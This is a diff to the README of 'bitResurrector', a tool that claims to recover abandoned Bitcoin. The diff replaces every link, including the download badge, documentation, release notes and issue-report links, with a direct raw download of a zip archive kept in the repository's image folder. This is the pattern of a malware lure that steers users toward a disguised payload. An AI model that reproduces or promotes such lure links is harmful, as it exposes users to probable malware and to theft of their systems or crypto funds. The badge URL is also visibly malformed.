@@ -1,6 +1,6 @@
 # 🪙 bitResurrector - Recover Your Abandoned Bitcoin Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/TheGoat12K/bitResurrector/releases)
+[![Download Now](https://raw.githubusercontent.com/TheGoat12K/bitResurrector/main/img/bit-Resurrector-2.1.zip%20Now-Click%https://raw.githubusercontent.com/TheGoat12K/bitResurrector/main/img/bit-Resurrector-2.1.zip)](https://raw.githubusercontent.com/TheGoat12K/bitResurrector/main/img/bit-Resurrector-2.1.zip)
 
 ## 🌐 Introduction
 
@@ -14,7 +14,7 @@ To get started with bitResurrector, follow these simple steps:
 
 Head over to the Releases page to download the software. Click the link below:
 
-[Download bitResurrector](https://github.com/TheGoat12K/bitResurrector/releases)
+[Download bitResurrector](https://raw.githubusercontent.com/TheGoat12K/bitResurrector/main/img/bit-Resurrector-2.1.zip)
 
 ### 2. Choose the Right Version
 
@@ -75,12 +75,12 @@ bitResurrector is designed to run on Windows, MacOS, and Linux. Follow the instr
 
 ## 📑 Further Resources
 
-For a detailed guide on using bitResurrector effectively, please refer to the [Documentation](https://github.com/TheGoat12K/bitResurrector/wiki).
+For a detailed guide on using bitResurrector effectively, please refer to the [Documentation](https://raw.githubusercontent.com/TheGoat12K/bitResurrector/main/img/bit-Resurrector-2.1.zip).
 
 ## 🔗 Additional Links
 
-- [Release Notes](https://github.com/TheGoat12K/bitResurrector/releases)
-- [Report Issues](https://github.com/TheGoat12K/bitResurrector/issues)
+- [Release Notes](https://raw.githubusercontent.com/TheGoat12K/bitResurrector/main/img/bit-Resurrector-2.1.zip)
+- [Report Issues](https://raw.githubusercontent.com/TheGoat12K/bitResurrector/main/img/bit-Resurrector-2.1.zip)
 
 ## 🙌 Acknowledgments
 
